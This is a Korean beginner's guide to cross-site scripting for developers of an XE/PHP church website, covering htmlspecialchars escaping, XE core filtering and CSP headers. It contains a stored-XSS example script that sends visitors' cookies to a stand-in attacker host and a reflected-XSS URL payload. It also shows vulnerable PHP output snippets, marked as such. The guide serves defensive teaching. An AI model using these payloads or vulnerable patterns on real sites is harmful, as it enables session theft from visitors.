# 🕸️ 쉽게 이해하는 XSS(크로스 사이트 스크립팅) 가이드

이 문서는 **XSS가 무엇인지 전혀 모르는 개발자**를 위해, 특히 **XE 게시판 / PHP 환경**에서 실제로 어떻게 발생하고 어떻게 막는지를 아주 쉽게 설명하는 가이드입니다.

> **함께 읽으면 좋은 문서**: [SQL Injection 쉬운 가이드](./sql-injection-easy-guide.md)

---

## 1. 💡 30초 요약 & 쉬운 비유

### XSS란?
악의적인 사용자가 게시판 글이나 댓글 등에 **일반 텍스트가 아닌 실행 가능한 스크립트 코드(JavaScript)**를 몰래 심어 놓고, 그 페이지를 방문하는 **다른 사람의 브라우저에서 코드가 실행**되게 만드는 공격 기법입니다.

### 📬 우편함 비유로 이해하기

1. **정상적인 상황:**
   - 교인 A가 교회 게시판에 `"이번 주 주보 확인하세요!"` 라는 글을 게시합니다.
   - 교인 B가 그 글을 열면 안내 문구만 보입니다. 평화롭습니다.

2. **XSS 공격 상황:**
   - 악의적인 사용자가 게시판에 글을 작성하는데, 내용에 **보이지 않는 투명 스크립트**를 숨깁니다.
   - 교인 B가 아무 의심 없이 그 글을 클릭합니다.
   - 글이 열리는 순간, 숨겨진 스크립트가 **교인 B의 브라우저에서 실행**됩니다.
   - 스크립트는 교인 B의 로그인 세션 쿠키를 훔쳐 해커에게 전송합니다.
   - 해커는 그 쿠키로 교인 B인 척 관리자 페이지에 접속합니다!

> 🔑 **핵심 문제점:** 게시판이 사용자가 입력한 내용 속의 HTML/JavaScript 코드를 **그대로 다른 방문자의 브라우저에 전달하여 실행시켜 버리기 때문에** 발생합니다.

---

## 2. 🚨 실제 작동 방식 (코드 비교)

### XSS 유형 1: 저장형 (Stored XSS) — 게시판에서 가장 위험!

XE 게시판에서 가장 흔히 발생하는 유형입니다. 악성 코드가 **DB에 저장**되어, 글을 조회하는 **모든 사용자가 피해자**가 됩니다.

#### 공격 시나리오

**1단계 — 해커가 글 작성:**
```html
제목: 이번 주 행사 안내

본문:
안녕하세요, 이번 주 행사를 알려드립니다.
<script>
  // 이 코드는 글을 읽는 사람의 브라우저에서 실행됩니다!
  var cookie = document.cookie; // 로그인 세션 쿠키 탈취
  new Image().src = "https://해커서버.com/steal?data=" + cookie;
</script>
```

**2단계 — DB에 저장됨:**
XE 게시판의 `xe_documents` 테이블 `content` 컬럼에 `<script>` 태그가 **글자 그대로** 저장됩니다.

**3단계 — 다른 교인이 글을 열 때:**
```php
<?php
// 취약한 PHP 코드: DB에서 가져온 내용을 그대로 HTML에 출력
echo $document->getContent();
// 브라우저는 <script> 태그를 실행 가능한 코드로 인식하여 실행!
?>
```

브라우저 화면에는 "안녕하세요, 이번 주 행사를 알려드립니다."만 보이지만, **눈에 보이지 않는 `<script>` 안의 코드가 백그라운드에서 조용히 실행**되어 쿠키가 탈취됩니다.

---

### XSS 유형 2: 반사형 (Reflected XSS) — 검색/URL 파라미터

사용자가 클릭한 링크의 URL 파라미터 값이 페이지에 그대로 출력될 때 발생합니다.

#### 공격 시나리오

해커가 교인에게 아래 링크를 메일이나 메신저로 보냅니다:
```
https://www.hyanglin.org/search?q=<script>alert('해킹!')</script>
```

서버의 취약한 검색 결과 페이지:
```php
<?php
// 취약한 코드: URL 파라미터를 그대로 출력
echo "'" . $_GET['q'] . "'에 대한 검색 결과입니다.";
?>
```

브라우저에는 `<script>alert('해킹!')</script>`이 실행되어 버립니다.

## 3. 💥 XSS로 실제로 일어나는 피해

| 피해 유형 | 설명 |
| :--- | :--- |
| **세션 하이재킹** | 관리자/교인의 로그인 쿠키를 빼돌려 그 사람인 척 로그인 |
| **피싱 화면 삽입** | 게시판 안에 가짜 로그인 폼을 띄워 비밀번호 수집 |
| **악성 리다이렉트** | 방문자를 악성 사이트로 자동 이동 |
| **키보드 감시** | 관리자가 입력하는 모든 키보드 입력을 해커에게 전송 |
| **사이트 변조 (디페이스)** | 화면 내용을 해커가 원하는 것으로 바꿔치기 |

## 4. 🛡️ 어떻게 막나요? (해결책)

핵심 원리: **사용자 입력값을 HTML로 출력할 때 반드시 이스케이프(Escape)하여, 브라우저가 코드로 해석하지 못하게 만들어라!**

### 1️⃣ 출력 시 HTML 이스케이프 (htmlspecialchars) ⭐️⭐️⭐️

PHP에서 가장 기본적이고 중요한 방어법입니다.

#### ❌ 위험한 방식 (그대로 출력)
```php
<?php
echo $userInput;
// 사용자가 <script>alert(1)</script>를 입력하면 그대로 실행됨!
?>
```

#### ✅ 안전한 방식 (이스케이프 후 출력)
```php
<?php
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
// <script>alert(1)</script> → &lt;script&gt;alert(1)&lt;/script&gt;
// 브라우저는 이것을 단순 텍스트로 표시할 뿐 절대 실행하지 않음
?>
```

#### 무슨 일이 일어난 걸까요?

`htmlspecialchars()`는 HTML에서 특별한 의미를 가진 문자를 **무력화된 엔티티 코드**로 변환합니다:

| 원래 문자 | 변환 결과 | 효과 |
| :--- | :--- | :--- |
| `<` | `&lt;` | 태그 시작으로 해석되지 않음 |
| `>` | `&gt;` | 태그 끝으로 해석되지 않음 |
| `"` | `&quot;` | 속성값 탈출 방지 |
| `'` | `&#039;` | 속성값 탈출 방지 |
| `&` | `&amp;` | 엔티티 코드 오해석 방지 |

---

### 2️⃣ XE에서의 방어 — 에디터 & 모듈 개발 시 주의

XE(XpressEngine)는 게시글 본문에 WYSIWYG 에디터(CKEditor 등)를 사용하므로 HTML 태그(`<p>`, `<img>` 등)가 허용되어야 합니다. 따라서 단순히 `htmlspecialchars()`만으로는 대응할 수 없고, **허용할 태그만 남기고 위험한 태그를 제거하는 화이트리스트(Whitelist) 방식**이 필요합니다.

#### XE 코어의 기본 방어 메커니즘
```php
// XE는 내부적으로 removeHackTag() 함수를 통해
// <script>, <iframe>, onerror=, onload= 등 위험 태그와 이벤트 핸들러를 필터링합니다.
// ✅ 코어의 getContent()를 통해 출력하면 기본 필터링이 적용됩니다.
```

#### ⚠️ 주의가 필요한 상황들
```php
// ❌ 위험: XE의 기본 필터를 우회하여 DB 값을 직접 출력하면 안 됩니다!
$oDocument = $oDocumentModel->getDocument($document_srl);
echo $oDocument->variables['content'];  // 필터 없이 직접 출력 — 위험!

// ✅ 안전: XE 코어 메서드를 통해 출력하세요.
echo $oDocument->getContent();          // 내부 필터 적용 후 출력
```

```php
// ❌ 위험: 모듈이나 위젯에서 사용자 입력(제목, 닉네임 등)을 그대로 출력
echo $oDocument->getTitleText();  // 제목에도 XSS 공격 코드가 들어올 수 있음

// ✅ 안전: 출력 전 반드시 이스케이프
echo htmlspecialchars($oDocument->getTitleText(), ENT_QUOTES, 'UTF-8');
```

### 3️⃣ CSP(Content Security Policy) 헤더 — 최후의 안전망

서버에서 아무리 잘 필터링해도 실수는 일어날 수 있습니다. CSP 헤더는 **브라우저 단에서 인라인 스크립트 실행 자체를 차단**하는 최후의 안전망입니다.

현재 향린교회 서버의 Nginx에는 이미 아래 CSP가 적용되어 있습니다:
```nginx
# nginx/conf.d/default.conf
add_header Content-Security-Policy "upgrade-insecure-requests;";
```

더 강화된 CSP 예시 (참고용):
```nginx
# 인라인 <script> 태그 실행 차단
add_header Content-Security-Policy "default-src 'self'; script-src 'self';";
```

> ⚠️ **참고**: 레거시 XE 사이트는 인라인 스크립트에 의존하는 부분이 많아 엄격한 CSP를 즉시 적용하면 사이트가 깨질 수 있습니다. 신규 Next.js 웹에서는 처음부터 엄격한 CSP를 적용하는 것이 바람직합니다.

## 5. 📝 개발자가 꼭 기억해야 할 3가지 규칙

1. **출력할 때 이스케이프!** — DB에서 가져온 값, URL 파라미터, 쿠키 값 등 외부에서 온 모든 값은 HTML로 출력하기 전에 반드시 `htmlspecialchars()`를 거치세요.
2. **XE 코어 메서드를 사용하세요** — `getContent()`, `getTitleText()` 등 XE가 제공하는 공식 메서드를 통해 출력하세요. DB 변수를 직접 `echo`하면 XE의 내장 필터가 무시됩니다.
3. **입력은 검증하고, 출력은 이스케이프하라** — 입력 시 위험 태그를 걸러내는 것도 중요하지만, **출력 시 이스케이프가 최종 방어선**입니다. 둘 다 하는 것이 안전합니다.

## 6. 🔍 SQL Injection과 XSS의 차이 — 한눈에 비교

| 구분 | SQL Injection | XSS |
| :--- | :--- | :--- |
| **공격 대상** | **서버의 데이터베이스** | **방문자의 웹 브라우저** |
| **주입하는 코드** | SQL 명령어 | JavaScript / HTML 코드 |
| **피해 범위** | DB 데이터 유출, 삭제, 조작 | 쿠키 탈취, 세션 하이재킹, 피싱 |
| **방어 핵심** | Prepared Statement (파라미터 바인딩) | htmlspecialchars() (출력 이스케이프) |
| **공격 원리** | 사용자 입력이 **SQL 명령어**로 해석됨 | 사용자 입력이 **브라우저 실행 코드**로 해석됨 |

> 💡 **한 줄 결론:** "사용자 입력값을 화면에 보여줄 때 절대로 HTML 그대로 출력하지 말고, 반드시 `htmlspecialchars()`로 이스케이프하자!"
